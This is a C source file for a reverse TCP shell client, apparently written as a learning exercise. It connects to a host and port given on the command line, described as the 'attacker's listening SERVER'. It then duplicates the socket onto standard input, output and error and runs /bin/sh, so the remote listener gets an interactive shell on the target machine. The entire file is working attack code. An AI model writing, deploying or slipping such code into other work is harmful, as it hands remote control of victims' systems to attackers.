#include <stdio.h>
#include <stdlib.h>
#include <getopt.h> // parse command line args
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

// CLIENT to connect to attacker's listening "SERVER"


#define CMD_SIZE 1024

#define USAGE                                                                                      \
    "usage:\n"                                                                                     \
    "  reverse_tcp [options]\n"                                                                    \
    "options:\n"                                                                                   \
    "  -s         The host you want your target machine to connect to (Default: localhost\n"       \
    "  -p         The port you want your target machine to connect to (Default: 4444)\n"           \
    "  -h         Show this help message\n"

/* STRUCT FOR OPTIONS ==================================================== */
// https://stackoverflow.com/questions/9642732/parsing-command-line-arguments-in-c
// static struct switches options[] = {
//     {"LHOST", required_argument, NULL, 's'},
//     {"LPORT", required_argument, NULL, 'p'},
//     {"help", no_argument, NULL, 'h'},
//     {NULL, 0, NULL, 0}};

/* MAIN ================================================================== */
int main(int argc, char **argv) {

    int opt = 0;
    char *lhost = "127.0.0.1";
    unsigned short lport = 4444;

    // parse and set command line arguments
    // https://www.geeksforgeeks.org/getopt-function-in-c-to-parse-command-line-arguments/
    // https://www.gnu.org/software/libc/manual/html_node/Example-of-Getopt.html
    while ((opt = getopt(argc, argv, "s:p:h:")) != -1) {
        switch (opt) {
            case 's': //server
                lhost = optarg;
                break;
            case 'p': //port
                lport = atoi(optarg);
                break;
            default: //show usage if error
                fprintf(stderr, "%s", USAGE);
                exit(1);
            case 'h': //help
                fprintf(stderr, "%s", USAGE);
                exit(0);
                break;
        }
    }
    //printf("lhost: %s\n", lhost); // test print [validated]
    //printf("port: %d\n", lport); // test print [validated]

    if (NULL == lhost) {
        fprintf(stderr, "%s @ %d: invalid lhost\n", __FILE__, __LINE__);
        exit(1);
    }

    if ((lport < 1025) || (lport > 65535))
    {
        fprintf(stderr, "%s @ %d: invalid port number (%d)\n", __FILE__, __LINE__, lport);
        exit(1);
    }

    /* SOCKET CODE ======================================================= */
    // create socket
    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) {
        fprintf(stderr, "STREAM SOCKET FAILURE\n");
        exit(1);
    }

    // structure the server address
    struct sockaddr_in server_addr; // use of the sockaddr_in struct for connect()
    memset(&server_addr, 0, sizeof(server_addr)); // if part of the struct is undefined, default with 0 (we only use 3/5)
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(lport); // host to network short; just in case it's needed
    int rtn = inet_pton(AF_INET, lhost, &server_addr.sin_addr.s_addr); // convert hostname to its binary representation
    if (rtn < 0) {
        fprintf(stderr, "ADDRESS FAILURE\n");
        exit(1);
    }

    // connect to the listening server
    int conn = connect(fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
    printf("%d\n", conn);
    if (conn < 0) {
        fprintf(stderr, "CONNECTION FAILURE\n");
        exit(1);
    }

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", 0, 0);

    // // receive commands from control server
    // char shell[CMD_SIZE];
    // size_t bytes_recv = 0;
    // while (1) {
    //     bytes_recv = recv(fd, shell, CMD_SIZE, 0);
    //     if (bytes_recv < 0) {
    //         fprintf(stderr, "RECEIVING FAILURE\n");
    //         exit(1);
    //     } else {
    //         // null terminate to make proper string
    //         shell[bytes_recv] = '\0';
    //         puts(shell);

    //         // get commands from control server
    //         command = 
    //     }

    // }
    



    return 0;
}